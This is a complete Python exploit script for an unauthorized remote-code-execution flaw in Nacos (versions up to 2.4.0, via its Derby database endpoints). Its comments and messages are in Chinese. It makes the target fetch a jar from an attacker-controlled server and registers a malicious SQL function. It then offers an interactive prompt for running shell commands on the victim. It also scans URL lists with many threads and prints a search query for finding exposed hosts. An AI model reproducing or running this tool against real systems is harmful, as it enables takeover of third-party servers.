import argparse
import random
import string
import sys
import threading
import uuid
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import quote

import requests
from tabulate import tabulate

requests.packages.urllib3.disable_warnings()


class NacosRce:
    def __init__(self, url, file, threads, server, headers, proxy, udf):
        self.url = url
        self.url_list = []
        self.file = file
        self.threads = threads
        self.server = server
        self.path1 = "nacos/v1/cs/ops/data/removal"
        self.path2 = "nacos/v1/cs/ops/derby"
        self.headers = headers
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.udf = udf
        self.success = False
        self.lock = threading.Lock()  # 添加线程锁

        # 每次运行程序只创建一次即可，不需要每个请求都用新的
        self.random_boundary = uuid.uuid4().hex
        self.random_string = ''.join(random.sample(string.ascii_letters, 8))

    def banner(self):
        vul_information = [
            ["漏洞首次披露时间", "2024-07-15"],
            ["漏洞名称", "Nacos Derby未授权RCE"],
            ["漏洞编号", "QVD-2024-26473"],
            ["影响版本", "Nacos <=2.4.0"],
            ["fofa搜索语法", 'app="nacos" && port="8848"']
        ]
        print(tabulate(vul_information, tablefmt="grid"))

    def initialize_eval_method(self, url):
        # 如果其他线程已成功，直接退出

        if self.success:
            return

        # 创建线程本地headers避免冲突
        thread_headers = self.headers.copy()
        thread_headers["Content-Type"] = f"multipart/form-data; boundary={self.random_boundary}"

        data = f"--{self.random_boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file\"\r\n\r\nCALL sqlj.install_jar('{self.server}', 'NACOS.{self.random_string}', 0)\r\n\r\n        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.{self.random_string}')\r\n\r\n        CREATE FUNCTION S_EXAMPLE_{self.random_string}( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'\r\n\r\n--{self.random_boundary}--"

        try:
            response = requests.post(url=url + self.path1, headers=thread_headers, data=data, proxies=self.proxy,
                                     verify=False, timeout=20)
            if "-f" in sys.argv:
                if "does not exist" in response.text or "/tmp/file" in response.text or "C:\\\\Users\\\\" in response.text or "\\\\Local\\\\Temp\\\\" in response.text or "cannot be read" in response.text:
                    print(f"[+]可能存在漏洞:  {url}")

            else:
                if not (
                        "does not exist" in response.text and ".tmp" in response.text) and ":200," in response.text or ":null," in response.text:
                    with self.lock:  # 使用线程锁确保安全
                        if not self.success:
                            self.success = True
                            sys.exit(f"\n[+] 成功创建恶意函数:   S_EXAMPLE_{self.random_string}")


                elif "already exists in Schema" in response.text or "DataIntegrityViolationException" in response.text:
                    with self.lock:
                        print(
                            f"返回异常! 可能的原因: 函数  S_EXAMPLE_{self.random_string}  已经创建过了可以直接使用-udf指定该函数执行命令")
                        sys.exit(f"\n返回内容:\n\n{response.text}")

                # 无法访问恶意文件
                elif "while accessing jar file" in response.text or "jdbc.UncategorizedSQLException" in response.text:
                    with self.lock:
                        print(f"返回异常! 可能的原因: 服务端异常或者受害机无法访问 {self.server}")
                        sys.exit(f"\n返回内容:\n\n{response.text}")

        except Exception as e:
            pass

    def check_config(self):
        if not ("-u" in sys.argv or "-f" in sys.argv):
            sys.exit("请使用-u或-f设置目标")
        if "-f" in sys.argv and "-udf" in sys.argv:
            sys.exit("-f只会对每个url发送一次请求进行初步验证是否可能存在漏洞,-f不能与-udf连用")
        if "-u" in sys.argv and ("-s" not in sys.argv and "--server" not in sys.argv) and "-udf" not in sys.argv:
            sys.exit("请用-s或--server指定恶意服务端,例如 -s http://ip:5000/download")
        if ("-s" in sys.argv or "--server" in sys.argv) and "-u" not in sys.argv:
            sys.exit("请用-u设置目标")

        def check_url_format(url):
            if "http" not in url:
                print(f"url格式错误: {url}")
                return None
            if not url.endswith("/"):
                return url + "/"
            return url

        if "-u" in sys.argv:
            url = check_url_format(self.url.strip())
            self.url = url
            if url:
                self.url_list.append(url)
        if "-f" in sys.argv:
            with open(self.file, "r", encoding='utf-8') as file:
                for url in file.readlines():
                    url = check_url_format(url.strip())
                    if url:
                        self.url_list.append(url)

    def multi_thread(self):
        # 持续尝试直到成功创建恶意函数
        with ThreadPoolExecutor(max_workers=self.threads, ) as executor:
            future_list = []
            print("程序正在运行...")
            if (len(self.url_list)) == 1:
                url = self.url_list[0]
                while not self.success:
                    future_list = [
                        executor.submit(self.initialize_eval_method, url) for _ in range(self.threads)
                    ]
                    for future in future_list:
                        future.result()
            else:
                for url in self.url_list:
                    future = executor.submit(self.initialize_eval_method, url)
                    future_list.append(future)
                for future in future_list:
                    future.result()

    def execute_cmd(self):
        if not self.udf:
            print("[-] 未指定恶意函数名，无法执行命令")
            return
        print("输入的命令不要用引号包裹,有些命令需要使用cmd.exe /c执行\n")

        while True:
            command = input("输入命令: ")
            encoded_command = quote(command, safe='')
            target_url = (self.url) + self.path2 + (
                f"?sql=select%20*%20from%20(select%20count(*)%20as%20b%2c%20"
                f"{self.udf}('{encoded_command}')%20as%20a%20from%20config_info)%20"
                f"tmp%20%2f*ROWS%20FETCH%20NEXT*%2f"
            )

            try:
                response = requests.get(url=target_url, headers=self.headers, proxies=self.proxy, verify=False,
                                        timeout=20)

                if "not recognized as a function" in response.text or "function or procedure" in response.text:
                    print(f"返回异常! 可能的原因: 函数   {self.udf}   未成功创建")
                    sys.exit(f"\n返回内容:\n\n{response.text}")

                print(f"\n[+] 命令执行结果:\n\n{response.text}")
            except Exception as e:
                print(f"[!] 命令执行失败: {str(e)}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="指定一个url", dest="url", required=False)
    parser.add_argument("-f", help="指定一个url文件(对每个url只发送一个请求进行初步验证)", dest="file", required=False)
    parser.add_argument("-H", dest="headers",
                        help="添加headers,可连续使用多个-H指定多个请求头,例如-H \"Cookie: xxxx\" -H \"User-Agent: xxx\"",
                        action="append", required=False, type=str)
    parser.add_argument("-t", "--threads", dest="threads",
                        help="设置线程数,默认为100", required=False, type=int, default=100)
    parser.add_argument("-s", "--server", help="恶意服务端,例如: -s http://127.0.0.1:5000/download", required=False)
    parser.add_argument("-p", "--proxy", help="设置http代理,例如: --proxy http://127.0.0.1:8080", required=False)
    parser.add_argument("-udf", dest="udf", help="指定之前成功创建的恶意函数名,例如 -udf S_EXAMPLE_xxxxxxxx",
                        required=False)
    args = parser.parse_args()

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    }

    # 处理自定义请求头
    if args.headers:
        for header in args.headers:
            if ':' in header:
                try:
                    key, value = header.split(':', 1)  
                    key = key.strip()
                    value = value.strip()
                    headers[key] = value
                except Exception as e:
                    sys.exit(e)

    exploit = NacosRce(url=args.url, file=args.file, threads=args.threads, server=args.server, headers=headers,
                       proxy=args.proxy, udf=args.udf)

    exploit.check_config()

    if exploit.udf:
        exploit.execute_cmd()
    else:
        exploit.banner()
        exploit.multi_thread()


if __name__ == '__main__':
    main()
